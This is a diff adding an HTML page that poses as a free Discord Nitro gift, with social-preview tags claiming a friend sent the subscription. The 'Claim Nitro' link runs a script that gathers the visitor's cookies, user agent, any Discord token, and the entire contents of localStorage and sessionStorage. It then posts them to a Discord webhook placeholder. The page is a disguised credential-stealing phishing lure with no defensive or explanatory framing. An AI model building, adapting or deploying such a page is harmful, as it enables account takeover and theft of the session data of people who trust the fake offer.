@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="You've been gifted a subscription!">
+    <meta property="og:description" content="Friend has gifted you Nitro for 1 month">
+    <meta property="og:image" content="https://share.icloud.com/photos/0e4MNsMzCE5sIsV1e6POf39Gw">
+    <meta property="og:url" content="https://inukedyou1.github.io/nitro-offer">
+    <title>Discord Nitro Offer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #36393f;
+            color: #ffffff;
+            padding: 50px;
+        }
+        .nitro-link {
+            cursor: pointer;
+            color: #7289da;
+            text-decoration: underline;
+        }
+        .nitro-img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>Claim Your Free Discord Nitro!</h1>
+    <img src="https://example.com/nitro-image.png" alt="Discord Nitro" class="nitro-img">
+    <p>Click the link below to claim your free Discord Nitro:</p>
+    <a class="nitro-link" onclick="gatherInfo()">Claim Nitro</a>
+
+    <script>
+        function gatherInfo() {
+            const userInfo = {
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            // Attempt to gather Discord token (this may not work due to browser security restrictions)
+            const token = localStorage.token || sessionStorage.token || '';
+            if (token) {
+                userInfo.token = token;
+            }
+
+            // Attempt to gather other sensitive information (this may not work due to browser security restrictions)
+            const localStorageData = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                localStorageData[key] = value;
+            }
+            userInfo.localStorage = localStorageData;
+
+            const sessionStorageData = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                sessionStorageData[key] = value;
+            }
+            userInfo.sessionStorage = sessionStorageData;
+
+            fetch('YOUR_DISCORD_WEBHOOK_URL', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `User Info: ${JSON.stringify(userInfo)}`
+                })
+            })
+            .then(response => console.log('Success:', response))
+            .catch((error) => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
